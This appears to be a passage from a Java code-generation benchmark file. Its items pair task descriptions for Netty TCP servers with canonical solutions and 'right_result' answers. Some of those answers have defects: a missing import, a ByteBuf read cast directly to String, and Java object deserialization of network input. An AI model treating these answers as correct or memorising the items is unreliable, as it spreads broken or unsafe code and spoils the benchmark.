b.group(bossGroup, workerGroup).channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(new Adapter());\n                        }\n                    }).option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port);\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    class Adapter extends ChannelInboundHandlerAdapter {\n        \n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            ByteBuf buf = (ByteBuf) msg;\n            byte[] res = new byte[buf.readableBytes()];\n            buf.readBytes(res);\n            buf.release();\n            \n            String str = new String(res).trim();\n            \n            Class cls = commands.get(str);\n            if (cls != null) {\n                Constructor constructor = cls.getDeclaredConstructor(String.class);\n                constructor.setAccessible(true);\n                Command command = (Command) constructor.newInstance(str);\n                sendStringL(ctx, command.execute());\n            } else {\n                sendString(ctx, \"command not found\\n\");\n            }\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            sendString(ctx, \"help \u5e2e\u52a9\u63d0\u793a\\r\\nhello \u4eba\u751f\u683c\u8a00\\r\\n\");\n            sendPrompt(ctx);\n        }\n\n        @Override\n        public void channelReadComplete(ChannelHandlerContext ctx) throws Exception {\n            sendPrompt(ctx);\n        }\n        \n        private void sendStringL(ChannelHandlerContext ctx, String text) {\n            if (!text.endsWith(\"\\n\")) {\n                text += \"\\n\";\n            }\n            sendString(ctx, text);\n        }\n        \n        private void sendString(ChannelHandlerContext ctx, String text) {\n            ByteBuf encoded = ctx.alloc().buffer(4 * text.length());\n            encoded.writeBytes(text.getBytes());\n            ctx.write(encoded);\n            ctx.flush();\n        }\n        \n        private void sendPrompt(ChannelHandlerContext ctx) {\n            sendString(ctx, \"> \");\n        }\n    }\n\n    public abstract static class Command {\n        private String command;\n        public Command(String command) {\n            this.command = command;\n        }\n        public abstract String execute();\n    }\n\n    public static class HelpCommand extends Command {\n        HelpCommand(String command) {\n            super(command);\n        }\n        @Override\n        public String execute() {\n            return \"\u6682\u65f6\u6ca1\u6709\u5e2e\u52a9\uff01\";\n        }\n    }\n\n    public static class HelloCommand extends Command {\n        String[] strings = new String[] {\n                \"Talking is cheap, show me the code!\",\n                \"\u652f\u6301\u4f5c\u8005<http://yeetor.com>\"\n        };\n        HelloCommand(String command) {\n            super(command);\n        }\n        @Override\n        public String execute() {\n            return strings[new java.util.Random().nextInt(strings.length)];\n        }\n    }\n\n    public static class DeviceCommand extends Command {\n        public DeviceCommand(String command) {\n            super(command);\n        }\n        @Override\n        public String execute() {\n            return BaseServer.getDevicesJSON();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.CharsetUtil;\n\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.Random;\n\npublic class Console {\n    private static final Console instance = new Console();\n    private final Map<String, Class<? extends Command>> commands = new ConcurrentHashMap<>();\n\n    public static Console getInstance() {\n        if (instance.commands.isEmpty()) {\n            instance.registerDefaultCommands();\n        }\n        return instance;\n    }\n\n    private void registerDefaultCommands() {\n        registerCommand(\"help\", HelpCommand.class);\n        registerCommand(\"hello\", HelloCommand.class);\n        registerCommand(\"device\", DeviceCommand.class);\n    }\n\n    private void registerCommand(String commandName, Class<? extends Command> commandClass) {\n        try {\n            commands.put(commandName, commandClass);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void listenOnTCP(int port) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(new Adapter());\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private abstract static class Command {\n        private final String command;\n\n        Command(String command) {\n            this.command = command;\n        }\n\n        public abstract String execute();\n    }\n\n    private static class HelpCommand extends Command {\n        HelpCommand(String command) {\n            super(command);\n        }\n\n        @Override\n        public String execute() {\n            StringBuilder sb = new StringBuilder(\"Available commands:\\n\");\n            for (String cmd : Console.getInstance().commands.keySet()) {\n                sb.append(cmd).append(\"\\n\");\n            }\n            return sb.toString();\n        }\n    }\n\n    private static class HelloCommand extends Command {\n        HelloCommand(String command) {\n            super(command);\n        }\n\n        @Override\n        public String execute() {\n            String[] greetings = {\"Hello!\", \"Hi there!\", \"Greetings!\"};\n            Random random = new Random();\n            return greetings[random.nextInt(greetings.length)];\n        }\n    }\n\n    private static class DeviceCommand extends Command {\n        DeviceCommand(String command) {\n            super(command);\n        }\n\n        @Override\n        public String execute() {\n            return \"{\\\"os\\\":\\\"Linux\\\",\\\"cpu\\\":\\\"x86_64\\\",\\\"memory\\\":4096}\";\n        }\n    }\n\n    private class Adapter extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            sendPrompt(ctx);\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            String input = ((String) msg).trim();\n            if (input.isEmpty()) {\n                sendPrompt(ctx);\n                return;\n            }\n\n            int spaceIndex = input.indexOf(' ');\n            String commandName = spaceIndex == -1 ? input : input.substring(0, spaceIndex);\n            String args = spaceIndex == -1 ? \"\" : input.substring(spaceIndex + 1);\n\n            try {\n                Class<? extends Command> commandClass = commands.get(commandName);\n                if (commandClass != null) {\n                    Command command = commandClass.getDeclaredConstructor(String.class).newInstance(args);\n                    String response = command.execute();\n                    sendString(ctx, response);\n                } else {\n                    sendString(ctx, \"Unknown command: \" + commandName);\n                }\n            } catch (Exception e) {\n                sendString(ctx, \"Error executing command: \" + e.getMessage());\n            }\n\n            sendPrompt(ctx);\n        }\n\n        @Override\n        public void channelReadComplete(ChannelHandlerContext ctx) {\n            ctx.flush();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n\n        private void sendStringL(ChannelHandlerContext ctx, String text) {\n            if (!text.endsWith(\"\\n\")) {\n                text += \"\\n\";\n            }\n            sendString(ctx, text);\n        }\n\n        private void sendString(ChannelHandlerContext ctx, String text) {\n            ctx.writeAndFlush(Unpooled.copiedBuffer(text, CharsetUtil.UTF_8));\n        }\n\n        private void sendPrompt(ChannelHandlerContext ctx) {\n            sendStringL(ctx, \"console>\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 203,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections, process requests, and manage server resources efficiently.\n\nClass Description: The MyServer class represents a Netty-based TCP server that listens on a specified port, handles incoming connections using NIO, processes client requests through a pipeline of handlers, and properly manages server resources during startup and shutdown.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nMyServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() throws Exception -> void - Starts the Netty server, configures the server bootstrap with event loop groups, channel type, pipeline handlers, and socket options. Binds to the specified port and keeps the server running until shutdown is triggered. Properly releases resources during shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class MyServer {\n\n    private int port;\n\n    public MyServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(\"decoder\", new MyDecoder());\n                     ch.pipeline().addLast(\"encoder\", new MyEncoder());\n                     ch.pipeline().addLast(new MyServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class MyServer {\n    private final int port;\n\n    public MyServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     ChannelPipeline pipeline = ch.pipeline();\n                     pipeline.addLast(new MyServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 204,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle object serialization and deserialization for client-server communication, with optional SSL support.\n\nClass Description: ObjectEchoServer is a Netty-based TCP server that listens for incoming connections, handles object serialization/deserialization, and echoes received objects back to clients. It supports optional SSL encryption and uses NIO for non-blocking I/O operations.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n- sslCtx: [SslContext] - SSL context for secure communication (nullable)\n\nMethods:\n- start(): [void] - Starts the Netty server, configures the pipeline with necessary handlers (SSL, object encoder/decoder, and business logic handler), and binds to the specified port. Handles resource cleanup on shutdown.\n  Input: None\n  Output: None (throws Exception if startup fails)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.serialization.ClassResolvers;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class ObjectEchoServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    if (sslCtx != null) {\n                        p.addLast(sslCtx.newHandler(ch.alloc()));\n                    }\n                    p.addLast(\n                            new ObjectEncoder(),\n                            new ObjectDecoder(ClassResolvers.cacheDisabled(null)),\n                            new ObjectEchoServerHandler());\n                }\n             });\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\n\npublic class ObjectEchoServer {\n    private final boolean SSL;\n    private final int PORT;\n    private SslContext sslCtx;\n\n    public ObjectEchoServer(boolean ssl, int port) throws Exception {\n        this.SSL = ssl;\n        this.PORT = port;\n        if (ssl) {\n            // For production use a proper certificate\n            this.sslCtx = SslContext.newServerContext(\n                    ObjectEchoServer.class.getResource(\"/server.crt\"),\n                    ObjectEchoServer.class.getResource(\"/server.key\"));\n        }\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline pipeline = ch.pipeline();\n                     if (SSL) {\n                         pipeline.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     pipeline.addLast(new io.netty.handler.codec.serialization.ObjectDecoder(ClassResolvers.weakCachingResolver(null)));\n                     pipeline.addLast(new io.netty.handler.codec.serialization.ObjectEncoder());\n                     pipeline.addLast(new ObjectEchoServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        boolean ssl = false; // Set to true for SSL\n        int port = 8080;     // Change as needed\n        new ObjectEchoServer(ssl, port).start();\n    }\n}\n\nclass ObjectEchoServerHandler extends SimpleChannelInboundHandler<Object> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n        ctx.write(msg);\n    }\n\n    @Override\n    public void channelReadComplete(ChannelHandlerContext ctx) {\n        ctx.flush();\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 205,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling incoming client connections and messages, with proper initialization and graceful shutdown.\n\nClass Description: NettyServer is a Spring component that sets up and manages a Netty-based TCP server. It handles server lifecycle including startup and shutdown, and delegates incoming connection handling to a specified handler initializer.\n\nAttributes:\n- logger: Logger - SLF4J logger for logging server events\n- port: Integer - Port number on which the server will listen (injected from configuration)\n- nettyServerHandlerInitializer: NettyServerHandlerInitializer - Handler for initializing channel pipelines (Spring-injected)\n- bossGroup: EventLoopGroup - Netty event loop group for accepting connections\n- workerGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- channel: Channel - Active server channel instance\n\nMethods:\n- start() -> void - Initializes and starts the Netty server (annotated with @PostConstruct)\n  - Input: None\n  - Output: None\n  - Throws: InterruptedException if thread is interrupted during startup\n- shutdown() -> void - Gracefully shuts down the server (annotated with @PreDestroy)\n  - Input: None\n  - Output: None",
    "Canonical_solution": "import cn.iocoder.springboot.lab67.nettyserverdemo.server.handler.NettyServerHandlerInitializer;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport java.net.InetSocketAddress;\n\n@Component\npublic class NettyServer {\n\n    private Logger logger = LoggerFactory.getLogger(getClass());\n\n    @Value(\"${netty.port}\")\n    private Integer port;\n\n    @Autowired\n    private NettyServerHandlerInitializer nettyServerHandlerInitializer;\n\n    private EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private Channel channel;\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .localAddress(new InetSocketAddress(port))\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childOption(ChannelOption.TCP_NODELAY, true)\n                .childHandler(nettyServerHandlerInitializer);\n        ChannelFuture future = bootstrap.bind().sync();\n        if (future.isSuccess()) {\n            channel = future.channel();\n            logger.info(\"[start][Netty Server started on port {}]\", port);\n        }\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport org.slf4j.Logger;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\n\n@Component\npublic class NettyServer {\n\n    private final Logger logger;\n    @Value(\"${netty.server.port}\")\n    private Integer port;\n    private final NettyServerHandlerInitializer nettyServerHandlerInitializer;\n    private EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n    private EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private Channel channel;\n\n    public NettyServer(Logger logger, NettyServerHandlerInitializer nettyServerHandlerInitializer) {\n        this.logger = logger;\n        this.nettyServerHandlerInitializer = nettyServerHandlerInitializer;\n    }\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(nettyServerHandlerInitializer)\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture future = bootstrap.bind(port).sync();\n        if (future.isSuccess()) {\n            channel = future.channel();\n            logger.info(\"Netty server started and listening on port {}\", port);\n        } else {\n            logger.error(\"Failed to start Netty server on port {}\", port);\n        }\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n        logger.info(\"Netty server gracefully shut down\");\n    }\n}\n```"
  },
  {
    "Task_id": 206,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and messages.\n\nClass Description: SimpleChatServer is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses a boss-worker thread model to handle connections efficiently and provides basic server configuration options.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nSimpleChatServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() -> void - Starts the server, binds it to the specified port, and keeps it running until shutdown. Handles resource cleanup during shutdown. Throws Exception if any error occurs during server startup or operation.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class SimpleChatServer {\n\n    private int port;\n\n    public SimpleChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new SimpleChatServerInitializer())\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n            \n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class SimpleChatServer {\n    private final int port;\n\n    public SimpleChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     // Add your custom channel handlers here\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 207,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process their requests.\n\nClass Description: UptimeServer is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses a boss-worker thread model to handle connections efficiently and includes logging for server events. The server remains active until explicitly shut down.\n\nAttributes:\n- PORT: int - The port number on which the server listens for incoming connections (default: 8080)\n- handler: UptimeServerHandler - The custom handler that processes incoming client requests\n\nMethods:\n- main: main(String[] args) -> void - The entry point of the application that configures and starts the Netty server\n  - args: String[] - Command line arguments (unused in this implementation)\n  - throws Exception - May throw exceptions during server startup or operation\n\nThe server uses two NioEventLoopGroups:\n1. bossGroup: Handles accepting new connections\n2. workerGroup: Handles processing of established connections\n\nThe server configuration includes:\n- Channel type: NioServerSocketChannel\n- Logging handler: LogLevel.INFO\n- Custom channel initializer that adds the UptimeServerHandler to the pipeline\n\nThe server binds to the specified port and remains running until shutdown. Resources are cleaned up gracefully on shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic final class UptimeServer {\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8080\"));\n    private static final UptimeServerHandler handler = new UptimeServerHandler();\n\n    public static void main(String[] args) throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .handler(new LoggingHandler(LogLevel.INFO))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(handler);\n                        }\n                    });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class UptimeServer {\n    private static final int PORT = 8080;\n    private final UptimeServerHandler handler = new UptimeServerHandler();\n\n    public static void main(String[] args) throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(handler);\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 208,
    "Instruction": "Task Description: Implement a Java class that creates a TCP server using Netty framework to handle HTTP file server functionality, including starting the server, configuring network options, and properly shutting down resources.\n\nClass Description: LoFileServer is a Netty-based HTTP file server that listens on a specified port, handles incoming HTTP requests, and manages server lifecycle operations. It uses Netty's non-blocking I/O model for high performance and includes proper resource cleanup.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\nchannel: Channel - The Netty channel representing the server's listening socket\nLogger: Logger - SLF4J logger instance for logging server events\n\nMethods:\nstart(): void - Starts the Netty server on the specified port. Configures thread groups, channel options, and HTTP pipeline handlers. Throws InterruptedException if the port is already in use or if startup fails.\nshutdown(): void - Gracefully shuts down the server by closing the channel and releasing all associated resources. Handles any interruption during shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class LoFileServer {\n    private static final Logger Logger = LoggerFactory.getLogger(LoFileServer.class);\n    private int port;\n    private Channel channel;\n\n    public LoFileServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        final EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        final EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            final ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .option(ChannelOption.SO_SNDBUF, 1024*1024*10)\n                .option(ChannelOption.SO_RCVBUF, 1024*1024*10)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                  